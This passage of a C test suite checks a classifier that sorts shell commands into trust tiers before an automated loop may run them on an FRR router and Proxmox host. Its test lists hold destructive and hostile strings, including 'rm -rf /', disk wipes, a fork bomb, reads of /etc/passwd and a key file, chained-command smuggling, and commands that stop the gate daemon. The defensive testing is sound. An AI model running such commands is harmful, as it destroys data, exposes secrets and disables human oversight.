    assert(linux_gate_tier("pveversion") == VIRP_TIER_GREEN);
    assert(linux_gate_tier("pvesm status") == VIRP_TIER_GREEN);
    assert(linux_gate_tier("pvesh get /cluster/resources") == VIRP_TIER_GREEN);
    PASS();

    TEST("configuring the set restores the VMID rows");
    prox_setup();
    assert(linux_gate_tier("qm status 100") == VIRP_TIER_GREEN);
    /* Configured + protected is BLACK; the unconfigured case above stays
     * RED, because "nobody told me what to protect" is a config error a
     * human should be able to look at, not a permanent refusal. */
    assert_black_blocked("qm stop 313");
    PASS();
}

/*
 * The Proxmox table is additive. The FRR rows, the peer rows and
 * RED-by-absence for everything else must read exactly as they did
 * before it existed.
 */
static void test_prox_does_not_broaden_frr(void)
{
    printf("\n=== Proxmox rows do not touch the FRR/peer/shell rows ===\n");
    prox_setup();

    TEST("FRR rows unchanged");
    assert(linux_gate_tier("vtysh -c \"show ip ospf neighbor\"") == VIRP_TIER_GREEN);
    assert(linux_gate_tier("vtysh -c \"show running-config\"") == VIRP_TIER_YELLOW);
    assert_red_blocked("vtysh -c \"configure terminal\"");
    PASS();

    TEST("peer rows unchanged");
    assert(linux_gate_tier("systemctl is-active virp-onode") == VIRP_TIER_GREEN);
    PASS();

    TEST("bare shell still RED by absence");
    assert_red_blocked("uptime -p");
    assert_red_blocked("cat /etc/passwd");
    PASS();

    /* Words that merely CONTAIN a tool name are not that tool: the
     * branch is entered on a whole first word only. */
    TEST("lookalike first words do not enter the Proxmox branch");
    assert_red_blocked("qmrestore 100");
    assert_red_blocked("pvesh-wrapper get /cluster/resources");
    assert_red_blocked("nice qm list");
    PASS();
}

/*
 * INVARIANT (REVISED 2026-08-12): BLACK is reachable, but only from an
 * enumerated never-class.
 *
 * This suite used to assert the opposite — that the table never returns
 * BLACK, so every refusal stayed approvable. That rule was correct while
 * no approval key was enrolled: RED cost nothing because nobody could
 * unlock it. Once an operator key exists, RED is exactly as strong as
 * the key holder's judgement, and a key that can approve
 * `systemctl stop virp-onode` can approve away the gate itself.
 *
 * So the invariant is now two-sided, and BOTH sides matter:
 *
 *   1. Everything in the never-class classifies BLACK — unapprovable,
 *      no proposal filed, apply refused with VIRP_ERR_TIER_VIOLATION.
 *   2. Everything ELSE that blocks stays RED — still approvable. This
 *      half is what stops the never-class from quietly growing until
 *      the escalation path is useless.
 *
 * The corpus below carries both classes and asserts each command lands
 * in the one it belongs to, so a future retiering in either direction
 * fails here.
 */
static void test_black_is_the_never_class(void)
{
    printf("\n=== INVARIANT — BLACK is exactly the never-class ===\n");
    prox_setup();

    /* The never-class: unapprovable by design. */
    static const char *const black_corpus[] = {
        /* guest + storage destruction */
        "qm destroy 100",
        "pct destroy 200",
        "pvesh delete /nodes/pve-lab/qemu/100",
        "pvesm remove tank",
        "pvesm free local:100/vm-100-disk-0.qcow2",
        "pvesm wipedisk pve-lab /dev/sdb",
        /* backup deletion */
        "vzdump 100 --delete 1",
        "vzdump --all --remove 1",
        "vzdump 100 --prune-backups keep-last=0",
        /* the protected guest, at every tier it could otherwise reach */
        "qm stop 313",
        "qm status 313",
        "qm destroy 313",
        "qm set 100 --memory 313",
        "pvesh get /nodes/pve-lab/qemu/313/config",
        "vzdump 313",
        /* host halt */
        "shutdown -h now",
        "reboot",
        "poweroff",
        "halt",
        "init 0",
        "telinit 6",
        "/sbin/shutdown -r now",
        "systemctl poweroff",
        "systemctl reboot",
        /* gate daemon takedown */
        "systemctl stop virp-onode",
        "systemctl disable virp-onode",
        "systemctl mask virp-onode.service",
        "systemctl kill virp-onode",
        "systemctl restart virp-onode",
        "pkill virp-onode",
        "killall virp-onode",
        /* the compound-string hole: the segment after the separator is
         * judged on its own merits, so this cannot land on approvable
         * RED and then execute the halt on apply */
        "qm list; shutdown -h now",
        "qm list && systemctl stop virp-onode",
        "qm list | reboot",
    };

    TEST("every never-class command classifies BLACK");
    for (size_t i = 0; i < sizeof(black_corpus) / sizeof(black_corpus[0]); i++)
        assert_black_blocked(black_corpus[i]);
    PASS();

    TEST("every never-class command is blocked at the gate");
    for (size_t i = 0; i < sizeof(black_corpus) / sizeof(black_corpus[0]); i++)
        assert(gate_blocks_at_yellow(linux_gate_tier(black_corpus[i])));
    PASS();

    /*
     * A long argument vector must not launder a takedown. The scan is
     * streaming precisely so there is no token bound to overrun: pad the
     * segment well past any plausible fixed buffer and the unit named at
     * the very end must still be seen.
     */
    TEST("filler arguments cannot push the unit past a token bound");
    {
        char padded[4096];
        size_t pos = 0;
        pos += (size_t)snprintf(padded + pos, sizeof(padded) - pos,
                                "systemctl stop");
        for (int i = 0; i < 300; i++)
            pos += (size_t)snprintf(padded + pos, sizeof(padded) - pos,
                                    " --no-block");
        snprintf(padded + pos, sizeof(padded) - pos, " virp-onode");
        assert_black_blocked(padded);
    }
    PASS();

    static const char *const corpus[] = {
        /* GREEN + YELLOW rows */
        "vtysh -c \"show ip ospf neighbor\"",
        "vtysh -c \"show running-config\"",
        "vtysh -c \"clear ip ospf neighbor\"",
        "vtysh -c \"clear ip ospf interface eth1\"",
        "vtysh -c \"ping 10.10.12.2\"",
        "vtysh -c \"traceroute 4.4.4.4\"",
        /* teaching-RED rows */
        "vtysh -c \"configure terminal\"",
        "vtysh -c \"clear ip ospf process\"",
        "sed -i s/1/2/ /etc/frr/frr.conf",
        "systemctl restart frr",
        /* guards */
        "vtysh -c \"show ip ospf neighbor\"; rm -rf /etc/frr",
        "vtysh -c \"show x\" -c \"configure terminal\"",
        "FRR_PAGER=cat vtysh -c \"show running-config\"",
        /* peer + host rows and their neighbours */
        "systemctl is-active virp-onode",
        "systemctl is-enabled virp-onode",
        "cat /var/lib/virp/autopilot/published.json",
        "cat /etc/virp/keys/onode.key",
        "df -h",
        "uptime",
        "uname -a",
        "df -h /var",
        /* Proxmox rows, across the approvable tiers */
        "qm list",
        "qm status 100",
        "pvesh get /cluster/resources",
        "pvesh get /access/users",
        "qm stop 100",
        "qm snapshot 100 pre-change",
        "vzdump 100 --storage local",
        "qm guest exec 100 rm -rf /",
        "qm delsnapshot 100 pre-change",
        "qm list; rm -rf /",
        "qm stop notanumber",
        /* destructive, but NOT the never-class: these stay approvable,
         * because a human looking at them is the whole point */
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
        "systemctl stop frr",
        "vtysh -c \"write erase\"",
        "chmod -R 777 /etc",
        "userdel -r nhoward",
        ":(){ :|:& };:",
        "",
    };

    TEST("nothing outside the never-class classifies BLACK");
    for (size_t i = 0; i < sizeof(corpus) / sizeof(corpus[0]); i++) {
        virp_trust_tier_t t = linux_gate_tier(corpus[i]);
        assert(t != VIRP_TIER_BLACK);
        /* and the tier must be one the wire can carry */
        assert(t == VIRP_TIER_GREEN || t == VIRP_TIER_YELLOW ||
               t == VIRP_TIER_RED);
    }
    assert(linux_gate_tier(NULL) != VIRP_TIER_BLACK);
    PASS();

    TEST("every other blocked command stays RED (approvable)");
    for (size_t i = 0; i < sizeof(corpus) / sizeof(corpus[0]); i++) {
        virp_trust_tier_t t = linux_gate_tier(corpus[i]);
        if (gate_blocks_at_yellow(t))
            assert(t == VIRP_TIER_RED);
    }
    PASS();

    /* The never-class must not have swallowed the ordinary guest verbs
     * that merely share a word with it. `qm reboot 100` reboots a guest;
     * `reboot` halts this host. Position is the only thing separating
     * them, and this is the assertion that keeps it that way. */
    TEST("host-halt words stay innocent at non-command positions");
    assert(linux_gate_tier("qm reboot 100")   == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm shutdown 100") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("pct reboot 200")  == VIRP_TIER_YELLOW);
    PASS();
}

/*
 * Host-health reads — the first non-RED rows on the bare-shell surface.
 * Exact-match, so the interesting assertions are the near-misses.
 */
static void test_host_health_reads(void)
{
    printf("\n=== Host-health reads (exact match only) ===\n");

    TEST("df -h / uptime / uname -a -> GREEN");
    assert(linux_gate_tier("df -h")    == VIRP_TIER_GREEN);
    assert(linux_gate_tier("uptime")   == VIRP_TIER_GREEN);
    assert(linux_gate_tier("uname -a") == VIRP_TIER_GREEN);
    PASS();

    TEST("whitespace runs collapse into the row");
    assert(linux_gate_tier("  df   -h  ") == VIRP_TIER_GREEN);
    PASS();

    TEST("neighbouring spellings stay RED by absence");
    assert_red_blocked("df");
    assert_red_blocked("df -h /var");
    assert_red_blocked("uname");
    assert_red_blocked("uname -r");
    assert_red_blocked("uptime -p");
    PASS();

    /* Exactness is what makes these metacharacter-proof without their
     * own raw-byte scan: a compound string is not equal to any row. */
    TEST("compound strings never ride a host row");
    assert(linux_gate_tier("uptime; rm -rf /")   != VIRP_TIER_GREEN);
    assert(linux_gate_tier("df -h > /tmp/x")     != VIRP_TIER_GREEN);
    assert(linux_gate_tier("uname -a && reboot") != VIRP_TIER_GREEN);
    PASS();

    TEST("case is not folded");
    assert_red_blocked("DF -H");
    assert_red_blocked("Uptime");
    PASS();
}

static void test_gate_decisions(void)
{
    printf("\n=== Gate-level decisions at threshold YELLOW ===\n");

    TEST("GREEN read passes the gate");
    assert(!gate_blocks_at_yellow(linux_gate_tier("vtysh -c \"show ip ospf neighbor\"")));
    PASS();

    TEST("YELLOW action passes the gate");
    assert(!gate_blocks_at_yellow(linux_gate_tier("vtysh -c \"clear ip ospf neighbor\"")));
    PASS();

    TEST("RED config change blocks at the gate");
    assert(gate_blocks_at_yellow(linux_gate_tier("vtysh -c \"configure terminal\"")));
    PASS();

    TEST("guard rejection blocks at the gate");
    assert(gate_blocks_at_yellow(linux_gate_tier(
        "vtysh -c \"show ip ospf neighbor\"; rm -rf /etc/frr")));
    PASS();

    /* The deployed threshold is YELLOW, so a Proxmox action tier passes
     * and self-protection is the ONLY thing standing between the loop
     * and its own gate. Asserted as a gate decision, not just a tier. */
    TEST("Proxmox read and action pass, self-protected VMID blocks");
    prox_setup();
    assert(!gate_blocks_at_yellow(linux_gate_tier("qm list")));
    assert(!gate_blocks_at_yellow(linux_gate_tier("qm stop 100")));
    assert(gate_blocks_at_yellow(linux_gate_tier("qm stop 313")));
    assert(gate_blocks_at_yellow(linux_gate_tier("qm destroy 100")));
    assert(gate_blocks_at_yellow(linux_gate_tier("qm list; rm -rf /")));
    PASS();
}

int main(void)
{
    printf("=== Linux/FRR vtysh Gate Classifier Tests ===\n");

    test_guard_separators();
    test_guard_vtysh_form();
    test_no_case_folding();
    test_no_abbreviation_expansion();
    test_green();
    test_yellow();
    test_red_teaching_rows();
    test_red_by_absence();
    test_peer_health_rows();
    test_prox_metachar_guard();
    test_prox_green();
    test_prox_yellow();
    test_prox_red();
    test_prox_self_protection();
    test_prox_unparseable_vmid();
    test_prox_unconfigured_is_closed();
    test_prox_does_not_broaden_frr();
    test_host_health_reads();
    test_black_is_the_never_class();
    test_gate_decisions();

    printf("\n=== Results: %d/%d passed ===\n", tests_passed, tests_run);
    return tests_passed == tests_run ? 0 : 1;
}
